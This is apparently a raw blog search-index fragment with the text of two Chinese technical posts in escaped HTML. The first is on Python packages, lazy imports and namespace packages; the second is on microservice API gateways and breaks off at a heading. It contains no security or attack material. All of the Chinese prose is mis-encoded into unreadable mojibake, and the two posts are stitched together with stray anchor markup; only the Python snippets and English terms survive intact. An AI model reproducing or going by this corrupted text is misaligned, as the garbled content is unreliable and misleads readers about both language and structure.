&lt;p&gt;å¯¹åè€…è€Œè¨€ï¼Œè®©mymoduleæˆä¸ºä¸€ä¸ªå¤§çš„æºæ–‡ä»¶æ˜¯æœ€å¸¸è§çš„ã€‚ä½†æ˜¯ï¼Œè¿™ä¸€ç« èŠ‚å±•ç¤ºäº†å¦‚ä½•åˆå¹¶å¤šä¸ªæ–‡ä»¶åˆå¹¶æˆä¸€ä¸ªå•ä¸€çš„é€»è¾‘å‘½åç©ºé—´ã€‚ è¿™æ ·åšçš„å…³é”®æ˜¯åˆ›å»ºä¸€ä¸ªåŒ…ç›®å½•ï¼Œä½¿ç”¨ &lt;code&gt;__init__.py&lt;/code&gt; æ–‡ä»¶æ¥å°†æ¯éƒ¨åˆ†ç²˜åˆåœ¨ä¸€èµ·ã€‚&lt;/p&gt;
&lt;p&gt;å½“ä¸€ä¸ªæ¨¡å—è¢«åˆ†å‰²ï¼Œä½ éœ€è¦ç‰¹åˆ«æ³¨æ„äº¤å‰å¼•ç”¨çš„æ–‡ä»¶åã€‚ä¸¾ä¸ªä¾‹å­ï¼Œåœ¨è¿™ä¸€ç« èŠ‚ä¸­ï¼ŒBç±»éœ€è¦è®¿é—®Aç±»ä½œä¸ºåŸºç±»ã€‚ç”¨åŒ…çš„ç›¸å¯¹å¯¼å…¥ &lt;code&gt;from .a import A&lt;/code&gt; æ¥è·å–ã€‚&lt;/p&gt;
&lt;p&gt;æ•´ä¸ªç« èŠ‚éƒ½ä½¿ç”¨åŒ…çš„ç›¸å¯¹å¯¼å…¥æ¥é¿å…å°†é¡¶å±‚æ¨¡å—åç¡¬ç¼–ç åˆ°æºä»£ç ä¸­ã€‚è¿™ä½¿å¾—é‡å‘½åæ¨¡å—æˆ–è€…å°†å®ƒç§»åŠ¨åˆ°åˆ«çš„ä½ç½®æ›´å®¹æ˜“ã€‚ï¼ˆè§3å°èŠ‚ï¼‰&lt;/p&gt;
&lt;p&gt;ä½œä¸ºè¿™ä¸€ç« èŠ‚çš„å»¶ä¼¸ï¼Œå°†ä»‹ç»å»¶è¿Ÿå¯¼å…¥ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œ&lt;code&gt;__init__.py&lt;/code&gt;æ–‡ä»¶ä¸€æ¬¡å¯¼å…¥æ‰€æœ‰å¿…éœ€çš„ç»„ä»¶çš„ã€‚ä½†æ˜¯å¯¹äºä¸€ä¸ªå¾ˆå¤§çš„æ¨¡å—ï¼Œå¯èƒ½ä½ åªæƒ³ç»„ä»¶åœ¨éœ€è¦æ—¶è¢«åŠ è½½ã€‚ è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œ&lt;code&gt;__init__.py&lt;/code&gt;æœ‰ç»†å¾®çš„å˜åŒ–ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# __init__.py
def A():
    from .a import A
    return A()

def B():
    from .b import B
    return B()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨è¿™ä¸ªç‰ˆæœ¬ä¸­ï¼Œç±»Aå’Œç±»Bè¢«æ›¿æ¢ä¸ºåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶åŠ è½½æ‰€éœ€çš„ç±»çš„å‡½æ•°ã€‚å¯¹äºç”¨æˆ·ï¼Œè¿™çœ‹èµ·æ¥ä¸ä¼šæœ‰å¤ªå¤§çš„ä¸åŒã€‚ ä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import mymodule
&amp;gt;&amp;gt;&amp;gt; a = mymodule.A()
&amp;gt;&amp;gt;&amp;gt; a.spam()
A.spam
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å»¶è¿ŸåŠ è½½çš„ä¸»è¦ç¼ºç‚¹æ˜¯ç»§æ‰¿å’Œç±»å‹æ£€æŸ¥å¯èƒ½ä¼šä¸­æ–­ã€‚ä½ å¯èƒ½ä¼šç¨å¾®æ”¹å˜ä½ çš„ä»£ç ï¼Œä¾‹å¦‚:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if isinstance(x, mymodule.A): # Error
...

if isinstance(x, mymodule.a.A): # Ok
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å»¶è¿ŸåŠ è½½çš„çœŸå®ä¾‹å­, è§æ ‡å‡†åº“ &lt;code&gt;multiprocessing/__init__.py&lt;/code&gt; çš„æºç .&lt;/p&gt;
&lt;h2 id=&#34;5-åˆ©ç”¨å‘½åç©ºé—´å¯¼å…¥ç›®å½•åˆ†æ•£çš„ä»£ç &#34;&gt;5 åˆ©ç”¨å‘½åç©ºé—´å¯¼å…¥ç›®å½•åˆ†æ•£çš„ä»£ç &lt;/h2&gt;
&lt;p&gt;ä½ å¯èƒ½æœ‰å¤§é‡çš„ä»£ç ï¼Œç”±ä¸åŒçš„äººæ¥åˆ†æ•£åœ°ç»´æŠ¤ã€‚æ¯ä¸ªéƒ¨åˆ†è¢«ç»„ç»‡ä¸ºæ–‡ä»¶ç›®å½•ï¼Œå¦‚ä¸€ä¸ªåŒ…ã€‚ç„¶è€Œï¼Œä½ å¸Œæœ›èƒ½ç”¨å…±åŒçš„åŒ…å‰ç¼€å°†æ‰€æœ‰ç»„ä»¶è¿æ¥èµ·æ¥ï¼Œä¸æ˜¯å°†æ¯ä¸€ä¸ªéƒ¨åˆ†ä½œä¸ºç‹¬ç«‹çš„åŒ…æ¥å®‰è£…ã€‚&lt;/p&gt;
&lt;p&gt;ä»æœ¬è´¨ä¸Šè®²ï¼Œä½ è¦å®šä¹‰ä¸€ä¸ªé¡¶çº§PythonåŒ…ï¼Œä½œä¸ºä¸€ä¸ªå¤§é›†åˆåˆ†å¼€ç»´æŠ¤å­åŒ…çš„å‘½åç©ºé—´ã€‚è¿™ä¸ªé—®é¢˜ç»å¸¸å‡ºç°åœ¨å¤§çš„åº”ç”¨æ¡†æ¶ä¸­ï¼Œæ¡†æ¶å¼€å‘è€…å¸Œæœ›é¼“åŠ±ç”¨æˆ·å‘å¸ƒæ’ä»¶æˆ–é™„åŠ åŒ…ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ç»Ÿä¸€ä¸åŒçš„ç›®å½•é‡Œç»Ÿä¸€ç›¸åŒçš„å‘½åç©ºé—´ï¼Œä½†æ˜¯è¦åˆ å»ç”¨æ¥å°†ç»„ä»¶è”åˆèµ·æ¥çš„&lt;code&gt;__init__.py&lt;/code&gt;æ–‡ä»¶ã€‚å‡è®¾ä½ æœ‰Pythonä»£ç çš„ä¸¤ä¸ªä¸åŒçš„ç›®å½•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;foo-package/
    spam/
        blah.py

bar-package/
    spam/
        grok.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨è¿™2ä¸ªç›®å½•é‡Œï¼Œéƒ½æœ‰ç€å…±åŒçš„å‘½åç©ºé—´spamã€‚åœ¨ä»»ä½•ä¸€ä¸ªç›®å½•é‡Œéƒ½æ²¡æœ‰&lt;code&gt;__init__.py&lt;/code&gt;æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;è®©æˆ‘ä»¬çœ‹çœ‹ï¼Œå¦‚æœå°†foo-packageå’Œbar-packageéƒ½åŠ åˆ°pythonæ¨¡å—è·¯å¾„å¹¶å°è¯•å¯¼å…¥ä¼šå‘ç”Ÿä»€ä¹ˆ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import sys
&amp;gt;&amp;gt;&amp;gt; sys.path.extend([&#39;foo-package&#39;, &#39;bar-package&#39;])
&amp;gt;&amp;gt;&amp;gt; import spam.blah
&amp;gt;&amp;gt;&amp;gt; import spam.grok
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸¤ä¸ªä¸åŒçš„åŒ…ç›®å½•è¢«åˆå¹¶åˆ°ä¸€èµ·ï¼Œä½ å¯ä»¥å¯¼å…¥spam.blahå’Œspam.grokï¼Œå¹¶ä¸”å®ƒä»¬èƒ½å¤Ÿå·¥ä½œã€‚&lt;/p&gt;
&lt;h3 id=&#34;è®¨è®º-5&#34;&gt;è®¨è®º&lt;/h3&gt;
&lt;p&gt;åœ¨è¿™é‡Œå·¥ä½œçš„æœºåˆ¶è¢«ç§°ä¸ºâ€œåŒ…å‘½åç©ºé—´â€çš„ä¸€ä¸ªç‰¹å¾ã€‚ä»æœ¬è´¨ä¸Šè®²ï¼ŒåŒ…å‘½åç©ºé—´æ˜¯ä¸€ç§ç‰¹æ®Šçš„å°è£…è®¾è®¡ï¼Œä¸ºåˆå¹¶ä¸åŒçš„ç›®å½•çš„ä»£ç åˆ°ä¸€ä¸ªå…±åŒçš„å‘½åç©ºé—´ã€‚å¯¹äºå¤§çš„æ¡†æ¶ï¼Œè¿™å¯èƒ½æ˜¯æœ‰ç”¨çš„ï¼Œå› ä¸ºå®ƒå…è®¸ä¸€ä¸ªæ¡†æ¶çš„éƒ¨åˆ†è¢«å•ç‹¬åœ°å®‰è£…ä¸‹è½½ã€‚å®ƒä¹Ÿä½¿äººä»¬èƒ½å¤Ÿè½»æ¾åœ°ä¸ºè¿™æ ·çš„æ¡†æ¶ç¼–å†™ç¬¬ä¸‰æ–¹é™„åŠ ç»„ä»¶å’Œå…¶ä»–æ‰©å±•ã€‚&lt;/p&gt;
&lt;p&gt;åŒ…å‘½åç©ºé—´çš„å…³é”®æ˜¯ç¡®ä¿é¡¶çº§ç›®å½•ä¸­æ²¡æœ‰&lt;code&gt;__init__.py&lt;/code&gt;æ–‡ä»¶æ¥ä½œä¸ºå…±åŒçš„å‘½åç©ºé—´ã€‚ç¼ºå¤±&lt;code&gt;__init__.py&lt;/code&gt;æ–‡ä»¶ä½¿å¾—åœ¨å¯¼å…¥åŒ…çš„æ—¶å€™ä¼šå‘ç”Ÿæœ‰è¶£çš„äº‹æƒ…ï¼šè¿™å¹¶æ²¡æœ‰äº§ç”Ÿé”™è¯¯ï¼Œè§£é‡Šå™¨åˆ›å»ºäº†ä¸€ä¸ªç”±æ‰€æœ‰åŒ…å«åŒ¹é…åŒ…åçš„ç›®å½•ç»„æˆçš„åˆ—è¡¨ã€‚ç‰¹æ®Šçš„åŒ…å‘½åç©ºé—´æ¨¡å—è¢«åˆ›å»ºï¼Œåªè¯»çš„ç›®å½•åˆ—è¡¨å‰¯æœ¬è¢«å­˜å‚¨åœ¨å…¶&lt;code&gt;__path__&lt;/code&gt;å˜é‡ä¸­ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import spam
&amp;gt;&amp;gt;&amp;gt; spam.__path__
_NamespacePath([&#39;foo-package/spam&#39;, &#39;bar-package/spam&#39;])
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨å®šä½åŒ…çš„å­ç»„ä»¶æ—¶ï¼Œç›®å½•&lt;code&gt;__path__&lt;/code&gt;å°†è¢«ç”¨åˆ°(ä¾‹å¦‚, å½“å¯¼å…¥spam.grokæˆ–è€…spam.blahçš„æ—¶å€™).&lt;/p&gt;
&lt;p&gt;åŒ…å‘½åç©ºé—´çš„ä¸€ä¸ªé‡è¦ç‰¹ç‚¹æ˜¯ä»»ä½•äººéƒ½å¯ä»¥ç”¨è‡ªå·±çš„ä»£ç æ¥æ‰©å±•å‘½åç©ºé—´ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾ä½ è‡ªå·±çš„ä»£ç ç›®å½•åƒè¿™æ ·ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;my-package/
    spam/
        custom.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚æœä½ å°†ä½ çš„ä»£ç ç›®å½•å’Œå…¶ä»–åŒ…ä¸€èµ·æ·»åŠ åˆ°sys.pathï¼Œè¿™å°†æ— ç¼åœ°åˆå¹¶åˆ°åˆ«çš„spamåŒ…ç›®å½•ä¸­ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import spam.custom
&amp;gt;&amp;gt;&amp;gt; import spam.grok
&amp;gt;&amp;gt;&amp;gt; import spam.blah
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸€ä¸ªåŒ…æ˜¯å¦è¢«ä½œä¸ºä¸€ä¸ªåŒ…å‘½åç©ºé—´çš„ä¸»è¦æ–¹æ³•æ˜¯æ£€æŸ¥å…¶__file__å±æ€§ã€‚å¦‚æœæ²¡æœ‰ï¼Œé‚£åŒ…æ˜¯ä¸ªå‘½åç©ºé—´ã€‚è¿™ä¹Ÿå¯ä»¥ç”±å…¶å­—ç¬¦è¡¨ç°å½¢å¼ä¸­çš„â€œnamespaceâ€è¿™ä¸ªè¯ä½“ç°å‡ºæ¥ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; spam.__file__
Traceback (most recent call last):
    File &amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
AttributeError: &#39;module&#39; object has no attribute &#39;__file__&#39;
&amp;gt;&amp;gt;&amp;gt; spam
&amp;lt;module &#39;spam&#39; (namespace)&amp;gt;
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ›´å¤šçš„åŒ…å‘½åç©ºé—´ä¿¡æ¯å¯ä»¥æŸ¥çœ‹ [PEP 420](https://www.python.org/dev/peps/pep-0420/ã€‚&lt;/p&gt;
">ã€pythonã€‘æ¨¡å—å’ŒåŒ…ç®¡ç†</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/wei-fu-wu-api-wang-guan/"" data-c="
          &lt;p&gt;å½“é€‰æ‹©å°†åº”ç”¨æ„å»ºæˆä¸ºä¸€ç»„å¾®æœåŠ¡æ—¶ï¼Œéœ€è¦å†³å®šåº”ç”¨å®¢æˆ·ç«¯å°†å¦‚ä½•ä¸å¾®æœåŠ¡è¿›è¡Œäº¤äº’ã€‚å•ä½“åº”ç”¨åªæœ‰ä¸€ç»„ç«¯ç‚¹ï¼ˆendpointï¼‰ï¼Œé€šå¸¸ä½¿ç”¨å‰¯æœ¬ï¼ˆreplicatedï¼‰ç»“åˆè´Ÿè½½å‡è¡¡æ¥åˆ†é…æµé‡ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œé€šå¸¸æ¯ä¸ªå¾®æœåŠ¡éƒ½æš´éœ²ä¸€ç»„æ¯”è¾ƒç»†é¢—ç²’çš„ç«¯ç‚¹ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ€ä¹ˆè®¿é—®å¾®æœåŠ¡&#34;&gt;æ€ä¹ˆè®¿é—®å¾®æœåŠ¡&lt;/h2&gt;
&lt;p&gt;ä¾‹å¦‚ä¸€ä¸ªè´­ç‰©åº”ç”¨è½¯ä»¶ï¼Œåœ¨å±•ç¤ºäº§å“çš„è¯¦ç»†é¡µé¢ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://872026152-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LAinv8dInYi41sSnmWu%2F-LAinzxGnqu1h1CS4HMv%2F-LAio20Stat_P81ysFrM%2F2-1.png?generation=1524425066238330&amp;amp;alt=media&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;äº§å“è¯¦ç»†ä¿¡æ¯é¡µé¢å±•ç¤ºäº†è®¸å¤šä¿¡æ¯ï¼Œä¸ä»…æœ‰åŸºæœ¬çš„äº§å“ä¿¡æ¯ï¼Œå¦‚åç§°ã€æè¿°å’Œä»·æ ¼ï¼Œè¿˜æœ‰ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è´­ç‰©è½¦ä¸­çš„ç‰©å“æ•°é‡&lt;/li&gt;
&lt;li&gt;è®¢å•å†å²&lt;/li&gt;
&lt;li&gt;å®¢æˆ·è¯„ä»·&lt;/li&gt;
&lt;li&gt;ä½åº“å­˜è­¦å‘Š&lt;/li&gt;
&lt;li&gt;é…é€é€‰é¡¹&lt;/li&gt;
&lt;li&gt;å„ç§æ¨èï¼ŒåŒ…æ‹¬äº†è´­ä¹°æ­¤äº§å“çš„å®¢æˆ·è´­ä¹°çš„å…¶ä»–äº§å“&lt;/li&gt;
&lt;li&gt;é€‰æ‹©æ€§è´­ä¹°é€‰é¡¹&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;åœ¨ä½¿ç”¨å•ä½“åº”ç”¨æ¶æ„çš„æƒ…å†µä¸‹ï¼Œç§»åŠ¨å®¢æˆ·ç«¯é€šè¿‡å¯¹åº”ç”¨è¿›è¡Œå•ä¸ª REST è°ƒç”¨æ¥æ£€ç´¢æ­¤æ•°æ®ï¼Œä¾‹å¦‚ï¼š&lt;code&gt;GET api.company.com/productdetails/productId&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;è´Ÿè½½å‡è¡¡å™¨å°†è¯·æ±‚è·¯ç”±åˆ°å‡ ä¸ªç›¸åŒåº”ç”¨å®ä¾‹ä¸­çš„å…¶ä¸­ä¸€ä¸ªã€‚ä¹‹åï¼Œåº”ç”¨æŸ¥è¯¢å„ä¸ªæ•°æ®åº“è¡¨å¹¶è¿”å›å“åº”ç»™å®¢æˆ·ç«¯ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œå½“ä½¿ç”¨å¾®æœåŠ¡æ¶æ„æ—¶ï¼Œäº§å“è¯¦ç»†é¡µé¢ä¸Šå±•ç¤ºçš„æ•°æ®æ¥è‡ªå¤šä¸ªå¾®æœåŠ¡ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›äº§å“è¯¦ç»†ä¿¡æ¯æ•°æ®å¯èƒ½æ¶‰åŠåˆ°çš„å¾®æœåŠ¡ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;è®¢å•æœåŠ¡&lt;/strong&gt; â€” è®¢å•å†å²&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç›®å½•ï¼ˆcatalogï¼‰æœåŠ¡&lt;/strong&gt; â€” åŸºæœ¬çš„äº§å“ä¿¡æ¯ï¼Œå¦‚äº§å“åç§°ã€å›¾ç‰‡å’Œä»·æ ¼&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è¯„ä»·æœåŠ¡&lt;/strong&gt; â€” å®¢æˆ·è¯„ä»·&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;åº“å­˜æœåŠ¡&lt;/strong&gt; â€” ä½åº“å­˜è­¦å‘Š&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;é…é€æœåŠ¡&lt;/strong&gt; â€” é…é€é€‰é¡¹ã€æœŸé™å’Œè´¹ç”¨ï¼Œç”±é…é€æ–¹çš„ API å•ç‹¬æä¾›&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ¨èæœåŠ¡&lt;/strong&gt; â€” æ¨èç±»ç›®&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://872026152-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LAinv8dInYi41sSnmWu%2F-LAinzxGnqu1h1CS4HMv%2F-LAio23gpF108R6KhnYZ%2F2-2.png?generation=1524425096893543&amp;amp;alt=media&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å› æ­¤æˆ‘ä»¬éœ€è¦å»è®©å®¢æˆ·ç«¯è®¿é—®è¿™äº›æœåŠ¡ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å®¢æˆ·ç«¯ä¸å¾®æœåŠ¡é€šä¿¡æ–¹å¼&#34;&gt;å®¢æˆ·ç«¯ä¸å¾®æœåŠ¡é€šä¿¡æ–¹å¼&lt;/h2&gt;
&lt;h3 id=&#34;ç›´æ¥é€šä¿¡&#34;&gt;ç›´æ¥é€šä¿¡&lt;/h3&gt;
&lt;p&gt;ç†è®ºä¸Šï¼Œå®¢æˆ·ç«¯å¯ä»¥ç›´æ¥å‘æ¯ä¸ªå¾®æœåŠ¡å‘é€è¯·æ±‚ã€‚æ¯ä¸ªå¾®æœåŠ¡éƒ½æœ‰ä¸€ä¸ªå…¬å¼€çš„ç«¯ç‚¹ï¼š&lt;code&gt;https://serviceName.api.company.name&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;è¯¥ URL å°†æ˜ å°„åˆ°ç”¨äºè·¨å¯ç”¨å®ä¾‹åˆ†å‘è¯·æ±‚çš„å¾®æœåŠ¡è´Ÿè½½å‡è¡¡å™¨ã€‚ä¸ºäº†æ£€ç´¢ç‰¹å®šçš„äº§å“é¡µé¢ä¿¡æ¯ï¼Œç§»åŠ¨å®¢æˆ·ç«¯å°†å‘ä¸Šè¿°çš„æ¯ä¸ªå¾®æœåŠ¡å‘é€è¯·æ±‚ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯è¿™ç§æ–¹å¼å­˜åœ¨é—®é¢˜ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯å®¢æˆ·ç«¯çš„éœ€æ±‚ä¸æ¯ä¸ªå¾®æœåŠ¡æš´éœ²çš„ç»†ç²’åº¦çš„ API ä¸åŒ¹é…ã€‚åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œå®¢æˆ·ç«¯éœ€è¦è¿›è¡Œä¸ƒæ¬¡å•ç‹¬çš„è¯·æ±‚ã€‚å¦‚æœåœ¨æ›´åŠ å¤æ‚çš„åº”ç”¨ä¸­ï¼Œå®ƒå¯èƒ½éœ€è¦åšæ›´å¤šçš„å·¥ä½œã€‚ä¾‹å¦‚ï¼ŒAmazon çš„äº§å“é¡µé¢æ¸²æŸ“ç‰µæ¶‰åˆ°æ•°ç™¾ä¸ªå¾®æœåŠ¡ã€‚è™½ç„¶å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡ LAN å‘é€è®¸å¤šè¯·æ±‚ï¼Œä½†åœ¨å…¬å…±äº’è”ç½‘ä¸‹æ•ˆç‡å·²ç»ä½ä¸‹ï¼Œåœ¨ç§»åŠ¨ç½‘ç»œå¿…ç„¶æ˜¯ä¸åˆ‡å®é™…ã€‚&lt;/li&gt;
&lt;li&gt;å®¢æˆ·ç«¯ç›´æ¥è°ƒç”¨å¾®æœåŠ¡çš„å¦ä¸€ä¸ªé—®é¢˜æ˜¯æœ‰äº›æœåŠ¡å¯èƒ½ä½¿ç”¨äº†é web å‹å¥½åè®®ã€‚ä¸€ä¸ªæœåŠ¡å¯èƒ½ä½¿ç”¨äº† Thrift äºŒè¿›åˆ¶ RPCï¼Œè€Œå¦ä¸€ä¸ªåˆ™å¯èƒ½ä½¿ç”¨ AMQP æ¶ˆæ¯åè®®ã€‚è¿™ä¸¤ä¸ªåè®®æ— è®ºæ˜¯å¯¹æµè§ˆå™¨è¿˜æ˜¯é˜²ç«å¢™æ¥è¯´éƒ½æ˜¯ä¸å‹å¥½çš„ï¼Œæœ€å¥½æ˜¯åœ¨å†…éƒ¨ä½¿ç”¨ã€‚åº”ç”¨åœ¨é˜²ç«å¢™ä¹‹å¤–åº”è¯¥ä½¿ç”¨ HTTP æˆ–è€… WebSocket ä¹‹ç±»çš„åè®®ã€‚&lt;/li&gt;
&lt;li&gt;å¦å¤–è¿™ç§æ–¹æ³•å®ƒéš¾ä»¥é‡æ„å¾®æœåŠ¡ã€‚éšç€æ—¶é—´æ¨ç§»ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šæƒ³æ”¹å˜ç³»ç»Ÿåˆ’åˆ†æœåŠ¡ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šåˆå¹¶ä¸¤ä¸ªæœåŠ¡æˆ–è€…å°†æœåŠ¡æ‹†åˆ†ä¸ºä¸¤ä¸ªæˆ–è€…å¤šä¸ªã€‚ç„¶è€Œï¼Œå¦‚æœå®¢æˆ·ç«¯ç›´æ¥ä¸æœåŠ¡è¿›è¡Œé€šä¿¡ï¼Œå®æ–½è¿™ç±»çš„é‡æ„å°†å˜å¾—éå¸¸å›°éš¾ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ç”±äºå­˜åœ¨è¿™äº›é—®é¢˜ï¼Œå¾ˆå°‘æœ‰å®¢æˆ·ç«¯ç›´æ¥ä¸å¾®æœåŠ¡è¿›è¡Œé€šä¿¡ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä½¿ç”¨-api-ç½‘å…³&#34;&gt;ä½¿ç”¨ API ç½‘å…³&lt;/h3&gt;
&lt;p&gt;é€šå¸¸æ›´å¥½çš„æ–¹å¼æ˜¯ä½¿ç”¨ API ç½‘å…³ã€‚API ç½‘å…³æ˜¯ä¸€ä¸ªæœåŠ¡å™¨ï¼Œæ˜¯ç³»ç»Ÿçš„å•å…¥å£ç‚¹ã€‚å®ƒç±»ä¼¼äºé¢å‘å¯¹è±¡è®¾è®¡æ¨¡å¼ä¸­çš„é—¨é¢ï¼ˆFacadeï¼‰æ¨¡å¼ã€‚API ç½‘å…³å°è£…äº†å†…éƒ¨ç³»ç»Ÿæ¶æ„ï¼Œå¹¶é’ˆå¯¹æ¯ä¸ªå®¢æˆ·ç«¯æä¾›ä¸€ä¸ªå®šåˆ¶ APIã€‚å®ƒè¿˜å¯ç”¨äº&lt;strong&gt;è®¤è¯ã€ç›‘æ§ã€è´Ÿè½½å‡è¡¡ã€ç¼“å­˜å’Œé™æ€å“åº”å¤„ç†&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://872026152-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LAinv8dInYi41sSnmWu%2F-LAinzxGnqu1h1CS4HMv%2F-LAio26eO3Q8M2XZzilg%2F2-3.png?generation=1524425104645261&amp;amp;alt=media&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;API ç½‘å…³è´Ÿè´£è¯·æ±‚è·¯ç”±ã€ç»„åˆå’Œåè®®è½¬æ¢ã€‚æ‰€æœ‰å®¢æˆ·ç«¯è¯·æ±‚é¦–å…ˆè¦é€šè¿‡ API ç½‘å…³ï¼Œä¹‹åè¯·æ±‚è¢«è·¯ç”±åˆ°é€‚å½“çš„æœåŠ¡ã€‚API ç½‘å…³é€šå¸¸ä¼šé€šè¿‡è°ƒç”¨å¤šä¸ªå¾®æœåŠ¡æ¥å¤„ç†ä¸€ä¸ªè¯·æ±‚å¹¶èšåˆç»“æœã€‚å®ƒå¯ä»¥åœ¨ Web åè®®ï¼ˆå¦‚ HTTP å’Œ WebSocketï¼‰å’Œç”¨äºå†…éƒ¨çš„é Web å‹å¥½åè®®ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚&lt;/p&gt;
&lt;p&gt;API ç½‘å…³è¿˜å¯ä»¥ä¸ºæ¯ä¸ªå®¢æˆ·ç«¯æä¾›ä¸€ä¸ªå®šåˆ¶ APIã€‚å®ƒé€šå¸¸ä¼šä¸ºç§»åŠ¨å®¢æˆ·ç«¯æš´éœ²ä¸€ä¸ªç²—ç²’åº¦çš„ APIã€‚ä¾‹å¦‚ï¼Œè€ƒè™‘ä¸€ä¸‹äº§å“è¯¦ç»†ä¿¡æ¯åœºæ™¯ï¼ŒAPI ç½‘å…³å¯ä»¥æä¾›ä¸€ä¸ªç«¯ç‚¹ &lt;code&gt;/productdetails?productid=xxx&lt;/code&gt;ï¼Œï¼ˆå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸€ä¸ªä½¿ç”¨äº† API ç½‘å…³çš„å¾®æœåŠ¡ï¼‰å…è®¸ç§»åŠ¨å®¢æˆ·ç«¯é€šè¿‡ä¸€ä¸ªå•ç‹¬çš„è¯·æ±‚æ¥æ£€ç´¢æ‰€æœ‰äº§å“è¯¦ç»†ä¿¡æ¯ã€‚API ç½‘å…³é€šè¿‡è°ƒç”¨å„ç§æœåŠ¡ï¼ˆäº§å“ä¿¡æ¯ã€æ¨èã€è¯„ä»·ç­‰ï¼‰å¹¶ç»„åˆç»“æœã€‚&lt;/p&gt;
&lt;h2 id=&#34;api-ç½‘å…³çš„ä¼˜ç‚¹ä¸ç¼ºç‚¹&#34;&gt;API ç½‘å…³çš„ä¼˜ç‚¹ä¸ç¼ºç‚¹&lt;/h2&gt;
